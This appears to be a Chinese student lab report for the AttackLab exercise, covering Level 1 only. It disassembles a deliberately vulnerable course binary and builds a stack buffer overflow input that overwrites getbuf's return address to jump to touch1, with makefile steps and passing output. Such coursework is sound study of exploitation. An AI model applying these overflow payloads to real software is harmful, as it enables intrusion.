#import "@preview/scripst:1.1.1": *

#show: scripst.with(
  template: "report",
  title: [计算机组成原理实验报告],
  info: [AttackLAB],
  author: ("Anzreww",),
  time: "2025年11月",
  contents: true,
  content-depth: 3,
  matheq-depth: 3,
  lang: "zh",
)

= 实验目的

= 实验内容

== Level 1: 简单缓冲区溢出

Level 1 要求我们利用缓冲区溢出漏洞，覆盖返回地址，使程序跳转到 `touch1` 函数，从而通过验证。

先将 `ctarget` 进行反汇编，查看其汇编代码，得到 `getbuf` 函数的栈帧布局和 `touch1` 函数的地址。

makefile 部分代码如下：
```makefile
CTARGET := ./ctarget
DISASC := ctarget.d
OUT=builds

disas_ctarget:
	mkdir -p $(OUT)
	objdump -M intel -d ./ctarget > $(OUT)/ctarget.d
	nm -n ./ctarget > $(OUT)/ctarget.sym
```
由此可以得到 `ctarget` 的反汇编文件 `ctarget.d` 和符号表 `ctarget.sym`。

查看汇编代码找到 `getbuf` 函数以及想要跳转到的 `touch1` 函数：
```asm
00000000008089c0 <getbuf>:
  8089c0:	48 83 ec 18          	sub    rsp,0x18
  8089c4:	48 89 e7             	mov    rdi,rsp
  8089c7:	e8 94 02 00 00       	call   808c60 <Gets>
  8089cc:	b8 01 00 00 00       	mov    eax,0x1
  8089d1:	48 83 c4 18          	add    rsp,0x18
  8089d5:	c3                   	ret

00000000008089d6 <touch1>:
  8089d6:	48 83 ec 08          	sub    rsp,0x8
  8089da:	c7 05 18 3b 20 00 01 	mov    DWORD PTR [rip+0x203b18],0x1        # a0c4fc <vlevel>
  8089e1:	00 00 00
  8089e4:	48 8d 3d 20 19 00 00 	lea    rdi,[rip+0x1920]        # 80a30b <_IO_stdin_used+0x27b>
  8089eb:	e8 d0 82 bf ff       	call   400cc0 <puts@plt>
  8089f0:	bf 01 00 00 00       	mov    edi,0x1
  8089f5:	e8 dd 04 00 00       	call   808ed7 <validate>
  8089fa:	bf 00 00 00 00       	mov    edi,0x0
  8089ff:	e8 1c 84 bf ff       	call   400e20 <exit@plt>
```
- `getbuf` 函数中调用了 `Gets` 函数从标准输入读取数据到栈上，栈空间大小为 0x18 字节（24 字节）。
- 所以注入时：写入 24 个字节“垃圾”之后，接下来的 8 个字节就正好覆盖返回地址。
- 我们写24个A字符作为填充，然后写入 `touch1` 函数的地址 `0x08089d6` 作为新的返回地址。

构造攻击输入：
```txt
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 d6 89 80 00 00 00 00 00
```
注意这是小端序存储，地址 `0x08089d6` 从低位到高位依次存储为 `d6 89 80 00 00 00 00 00`。之后将其转换为raw格式的文件进行输入即可。

```makefile
level1: $(CTARGET) disas_ctarget
	mkdir -p $(SRC)
	echo "41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 d6 89 80 00 00 00 00 00" > $(SRC)/ctarget01.txt
	$(HEX2RAW) < $(SRC)/ctarget01.txt > $(OUT)/level1-raw
	$(CTARGET) < $(OUT)/level1-raw
```
执行 `make level1` 即可完成 Level 1 的攻击
```txt
Cookie: 0x********
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```
